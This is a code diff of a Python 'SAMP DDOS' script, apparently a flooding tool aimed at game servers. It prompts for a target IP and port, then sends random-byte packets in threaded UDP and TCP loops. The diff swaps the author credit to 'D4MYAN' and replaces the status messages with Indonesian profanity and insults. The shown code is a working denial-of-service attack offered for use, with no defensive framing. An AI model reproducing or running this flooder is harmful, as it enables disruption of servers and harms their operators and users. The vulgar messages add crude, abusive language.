@@ -3,7 +3,7 @@ import random
 import socket
 import threading
 
-print("--> Tools by Leon Hengker Wibu Tzy<--")
+print("-->Tools by D4MYAN<--")
 print("#-- SAMP DDOS --#")
 ip = str(input(" IP:"))
 port = int(input(" Port:"))
@@ -19,9 +19,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Sent!!!")
+			print(i +" MAMPUS KONTOL ")
 		except:
-			print("[!] Error!!!")
+			print("[!] YAH DOWN AJG BABI")
 
 def run2():
 	data = random._urandom(16)
@@ -33,10 +33,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Sent!!!")
+			print(i +" MAMPUS KONTOL ")
 		except:
 			s.close()
-			print("[*] Error")
+			print("[*] YAH DOWN AJG BABI")
 
 for y in range(threads):
 	if choice == 'y':
